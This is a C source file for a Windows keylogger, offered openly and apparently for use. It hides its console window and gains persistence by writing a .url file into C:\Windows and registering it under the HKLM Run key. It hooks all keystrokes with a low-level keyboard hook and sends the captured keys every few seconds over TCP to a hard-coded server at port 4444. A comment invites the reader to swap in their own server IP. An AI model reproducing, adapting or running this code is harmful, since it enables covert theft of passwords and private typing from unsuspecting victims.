#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#define SERVER_IP "192.168.1.101"  //IP example, again you can fucking change it
#define SERVER_PORT 4444

#define URL_PATH "C:\\Windows\\exploit_lotusorg.url"
#define REG_RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_VALUE_NAME "LotusorgKey"

HHOOK keyboardHook;
SOCKET sock = INVALID_SOCKET;

char keyBuffer[1024];
int keyIndex = 0;

void CreatePersistenceURL() {
    FILE* f = fopen(URL_PATH, "w");
    if (f) {
        fprintf(f,
            "[InternetShortcut]\n"
            "URL=javascript:/*exploit payload*/\n"
            "IconFile=C:\\Windows\\system32\\shell32.dll\n"
            "IconIndex=1\n");
        fclose(f);
    }

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, REG_RUN_KEY, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, REG_VALUE_NAME, 0, REG_SZ,
            (const BYTE*)URL_PATH, (DWORD)(strlen(URL_PATH) + 1));
        RegCloseKey(hKey);
    }
}

void SendBuffer() {
    if (sock != INVALID_SOCKET && keyIndex > 0) {
        send(sock, keyBuffer, keyIndex, 0);
        keyIndex = 0;
        ZeroMemory(keyBuffer, sizeof(keyBuffer));
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        if (keyIndex < sizeof(keyBuffer) - 2) {
            keyBuffer[keyIndex++] = (char)kb->vkCode;
            keyBuffer[keyIndex] = 0;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int InitSocket() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
        return 0;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
        return 0;

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        sock = INVALID_SOCKET;
        return 0;
    }

    return 1;
}

int main() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    CreatePersistenceURL();

    if (!InitSocket()) {
    }

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (1) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        SendBuffer();
        Sleep(3000);

        if (!keyboardHook) {
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
        }
    }

    if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
    if (sock != INVALID_SOCKET) closesocket(sock);
    WSACleanup();

    return 0;
}
